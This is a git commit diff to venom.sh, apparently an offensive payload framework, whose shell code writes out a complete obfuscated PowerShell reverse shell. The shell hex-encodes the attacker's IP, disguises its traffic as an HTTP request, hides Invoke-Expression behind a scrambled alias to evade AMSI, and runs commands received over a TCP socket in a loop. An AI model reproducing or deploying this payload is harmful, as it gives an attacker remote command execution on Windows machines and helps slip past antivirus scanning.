9cf9a65c3921da865a4e6a78f3fc29ec7e373412
root <root@localhost.localdomain>
2019-12-24 04:09:52 +0000

    version v1.0.16 [amsi - Reverse Powershell Shell Hex Obfuscation]

--- venom.sh
+++ venom.sh
@@ -12306,11 +12306,10 @@ echo "${BlueF}[☠]${white} Obfuscated ip (hex):${GreenF}$hexed ${white}";sleep 
 
 
 ## Build Reverse Powershell Shell (obfuscated)
-
-
 echo "<#" > $IPATH/output/$NaM.ps1
 echo "Obfuscated (hex) Reverse Powershell Shell" >> $IPATH/output/$NaM.ps1
 echo "Framework: venom v1.0.16 (amsi evasion)" >> $IPATH/output/$NaM.ps1
+echo "Original shell: Paranoid Ninja" >> $IPATH/output/$NaM.ps1
 echo "#>" >> $IPATH/output/$NaM.ps1
 echo "" >> $IPATH/output/$NaM.ps1
 echo "while (\$true) {\$px = $hexed;\$p = (\$px | ForEach { [convert]::ToInt32(\$_,16) }) -join '.';\$w = \"GET /index.html HTTP/1.1\`r\`nHost: \$p\`r\`nMozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0\`r\`nAccept: text/html\`r\`n\`r\`n\";\$s = [System.Text.ASCIIEncoding];[byte[]]\$b = 0..65535|%{0};\$x = \"n-eiorvsxpk5\";Set-alias \$x (\$x[\$true-10] + (\$x[[byte](\"0x\" + \"FF\") - 265]) + \$x[[byte](\"0x\" + \"9a\") - 158]);\$y = New-Object System.Net.Sockets.TCPClient(\$p,$lport);\$z = \$y.GetStream();\$d = \$s::UTF8.GetBytes(\$w);\$z.Write(\$d, 0, \$d.Length);\$t = (n-eiorvsxpk5 whoami) + \"$ \";while((\$l = \$z.Read(\$b, 0, \$b.Length)) -ne 0){;\$v = (New-Object -TypeName \$s).GetString(\$b,0, \$l);\$d = \$s::UTF8.GetBytes((n-eiorvsxpk5 \$v 2>&1 | Out-String )) + \$s::UTF8.GetBytes(\$t);\$z.Write(\$d, 0, \$d.Length);}\$y.Close();Start-Sleep -Seconds 5}" >> $IPATH/output/$NaM.ps1
